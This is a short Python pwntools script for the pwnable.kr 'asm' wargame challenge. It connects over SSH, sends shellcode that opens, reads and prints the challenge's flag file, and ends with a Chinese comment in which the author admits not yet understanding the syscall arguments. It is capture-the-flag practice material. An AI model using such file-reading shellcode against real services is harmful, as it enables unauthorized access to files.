from pwn import *

r = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = r.connect_remote('localhost', 9026)
context(arch='amd64', os='linux')
shellcode=''
shellcode+=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode+=shellcraft.open('rsp',0,0)
shellcode+=shellcraft.read('rax','rsp',100)
shellcode+=shellcraft.write(1,'rsp',100)
p.recvuntil('shellcode:')
p.send(asm(shellcode))
print(p.recvline())

'''
这个脚本还没搞懂的地方在于read write的参数那里
以及为什么文件名就在rsp的位置上
暂时找不到shellcraft的文档，先放那
'''
